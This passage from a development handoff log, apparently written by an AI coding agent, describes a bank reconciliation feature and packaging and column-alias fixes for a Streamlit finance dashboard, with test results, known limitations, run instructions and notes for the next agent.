  - `bank_reconciliation.py`: normalises both sides to one signed amount (positive = money in) before comparing, because a statement is written from the **bank's** perspective — its "Debit" is money *out* of the account, which is a **credit** in the cash book. Three statement layouts are handled: Withdrawal/Deposit columns, Debit/Credit columns, and a single signed Amount column; the detected layout is reported to the user.
  - **Two-pass matching**, each entry consumed once: exact (same amount, same date), then timing (same amount, date within a tolerance, default 5 days). Timing differences are reported **separately** rather than folded into "matched", because cheques in clearing and deposits in transit are genuine reconciling items.
  - Residuals are the substance of the reconciliation: **in books only** (unpresented cheques) and **on statement only** (bank charges, interest, direct debits needing journals).
  - `statement_table()` produces the classic reconciliation statement: balance per cash book → less/add reconciling items → derived bank balance → actual bank balance → unexplained difference.
  - `is_reconciled` requires the unmatched items to explain the gap **exactly**. A zero difference with items outstanding is a coincidence, not a reconciliation, and is not reported as one.
  - **Bank Statement upload**: new canonical columns `bank_debit` / `bank_credit` / `bank_amount` / `bank_balance` (20 aliases), a detector signature, required fields, and a `bank_statement` session slot. Kept separate from `debit`/`credit` so the sign convention is never guessed.
  - **Checklist now has three states**: *Pending* (no statement), *Completed* (reconciled), and **Exception** (reconciliation ran but an unexplained difference remains) — a reconciliation that does not reconcile is not a completed control.
- **Validations Passed**:
  - Alias regression: **106/106** column aliases resolve correctly (86 existing + 20 new bank aliases); zero collisions, verified before the change.
  - Statement derived from the real ledger with planted differences (2 omitted, 3 date-shifted, 2 bank-only) and detected at **90.9% confidence** as a Bank Statement: **58 matched, 3 timing, 2 in books only, 2 on statement only**, unexplained difference **0.00**.
  - Month-End Close item flips **Pending → Completed** when a statement is uploaded, with notes describing the real outcome.
  - All 8 dashboard sections render both with and without a statement; `tests/test_financials.py` 6/6; acceptance suite extended to **51/51**.
  - With no statement the engine reports honestly that it cannot reconcile and returns an empty result — it never manufactures the other side.
- **Limitations**:
  - Matching is on amount and date. Two genuinely distinct transactions of the same amount on the same date are matched arbitrarily (first available); reference/description are shown for review but do not drive matching. A reference-first pass would tighten this where statements carry reliable cheque numbers.
  - The date tolerance is a fixed 5 days (`DEFAULT_DATE_TOLERANCE_DAYS`), not configurable from the UI.
  - Multi-currency statements are out of scope, consistent with the rest of the platform.
- **Status**: COMPLETE / AWAITING USER REVIEW

## HOUSEKEEPING / MAINTENANCE LOG

### H1-H3: Packaging & Column-Alias Fixes (pre-UP3)
- **Files Modified**: `requirements.txt`, `.gitignore`, `src/data_loader.py`
- **H1 — `requirements.txt` re-encoded**: the file was UTF-16-LE with a BOM and CRLF line endings (a PowerShell `pip freeze >` artifact), which breaks `pip install -r` on many systems. Rewritten as plain UTF-8 / LF with no BOM. All **57 pins preserved byte-for-byte** — content was transcoded, not regenerated from a local environment, so the author's intended dependency set is unchanged. **Verified** by building a throwaway virtual environment from scratch, installing from the new file (all 57 packages, exit 0), and running the project's own `tests/test_financials.py` inside it — **6/6 OK**.
- **H2 — `.gitignore` now ignores `.venv/`**: added alongside the existing `venv/` / `env/` entries. Previously a `.venv` directory was only excluded by the throwaway `.gitignore` that `python -m venv` writes inside itself; deleting that file would have exposed ~700MB to `git add`. Verified with `git check-ignore -v .venv` → matches `.gitignore:28`, confirmed still ignored with the venv's internal self-ignore temporarily removed.
- **H3 — separator-insensitive column aliases**: `ConfigurableColumnMapper` previously normalised only with `.lower().strip()`, so `AccountNumber` failed where `Account Number` matched. Added a `_squash()` normaliser (lowercase, strip every non-alphanumeric character) and a parallel `_squashed` index built in the same iteration order as `_reverse`. `find_canonical()` tries the **exact index first** and only falls back to the squashed one, so the change can add matches but never alter or remove an existing one. `AccountNumber`, `TransactionDate`, `DebitAmount`, `account_number`, `ACCOUNT-NAME` and `Closing Debit` now all resolve.
- **Collision analysis (done before the change)**: squashing introduces **zero new ambiguities**. The single alias claimed by two canonical fields — `"Description"` (`account_name` and `narration`) — is pre-existing, and resolves to `narration` in both the exact and squashed indexes because both are built in the same order.
- **Validations Passed**:
  - `tests/test_financials.py` **6/6** (both in the working env and in a clean env built from the new requirements file).
  - All 8 dashboard sections render; sidebar list unchanged from the UP1 baseline.
  - **Alias regression: 86/86 existing aliases still resolve to the same canonical field.** Unrelated headers (`Dept`, `CostCenter`, `Currency`, `GLID`, `Region`, `Notes`, empty string) correctly still return `None` — the fallback does not over-match.
  - All four UP2 fixtures byte-identical to their pre-change results: clean GL PASS, messy GL ERROR (same 7 errors / 2 warnings), wrong-column-names ERROR (1 error — its headers are genuinely different words, not separator variants, so they correctly still fail), clean TB PASS.
  - Real GL and TB sheets re-uploaded through UP2: unchanged, both PASS.
  - External camelCase export improved from **3/10 columns auto-mapped at 50.0% confidence to 6/10 at 85.7%**, with no manual override needed. The 4 remaining unmapped columns (`GLID`, `Dept`, `CostCenter`, `Currency`) have no canonical equivalent in this single-currency, no-cost-centre platform and correctly stay unmapped.
- **Deliberately NOT changed**: `WorkbookLoader._detect_header_row()` still scores candidate header rows against the exact index only. It runs solely when `header_row=None` (the dashboard passes `header_row=3`, and the upload path has its own probe), and making it more permissive could change which row is selected for some workbook. Left alone to keep this change isolated.
- **Status**: COMPLETE / APPROVED

## REMAINING PHASES (NOT YET STARTED)
- **None for core project** (Phases 1-10 complete).
- **Upload Feature UP1–UP6 all COMPLETE.** 42/42 acceptance criteria pass (`python tests/test_acceptance.py`).
- Bank Reconciliation (Month-End Close item 1) now functional — see the BR entry.
- **Open item**: two generated report files are tracked in git and present in history — see the UP6 entry's outstanding privacy issue.
- **No blockers.** The source dataset has been restored, `tests/test_financials.py` passes 6/6, and all 8 dashboard sections render.

## HOW TO RUN
- **Setup**: Ensure requirements are installed via `pip install -r requirements.txt`.
- **Launch Application**: Run the canonical Streamlit dashboard:
  ```powershell
  python -m streamlit run dashboard/app.py
  ```
- **Run Unit Tests**: Validate the core accounting engine:
  ```powershell
  python tests/test_financials.py
  ```

## RULES FOR THE NEXT AI AGENT PICKING THIS UP
- **Project is in a completed state**. Any future modifications should be treated as v2.0 enhancements.
- **Do not overwrite existing documentation** without explicit user permission.
- **Keep synthetic data separate** from raw data processing logic.
